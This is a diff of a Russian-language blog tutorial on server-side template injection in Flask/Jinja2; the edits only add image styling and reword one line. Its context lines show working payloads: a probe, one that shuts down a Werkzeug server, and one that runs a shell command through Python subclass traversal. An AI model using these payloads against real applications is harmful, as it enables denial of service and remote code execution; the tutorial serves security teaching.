@@ -42,7 +42,7 @@ if __name__ == "__main__":
 ###### Пример атаки
 Попробуем подставить в уязвимый параметр выражение `{%raw%}{{1+1}}{%endraw%}`
 
-![ssti1](/images/ssti1.png)
+![ssti1](/images/ssti1.png){: .shadow-image }
 
 ###### К чему мы получаем доступ
 * к объекту `request`
@@ -51,7 +51,7 @@ if __name__ == "__main__":
 
 
 ###### Остановка сервера
-В случае если мы используем werkzeug следующий payload приведет к остановке сервера
+В случае если мы используем сервер разработки следующий payload приведет к остановке сервера
 ```console
 {% raw %}{{ request.environ['werkzeug.server.shutdown']() }} {% endraw %}
 ```
@@ -64,7 +64,7 @@ if __name__ == "__main__":
 {{ ''.__class__.__mro__[1].__subclasses__()[282]('touch /tmp/rce',shell=True) }}{% endraw %}
 ```
 
-![ssti2](/images/ssti2.png)
+![ssti2](/images/ssti2.png){: .shadow-image }
 
 ##### Links
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
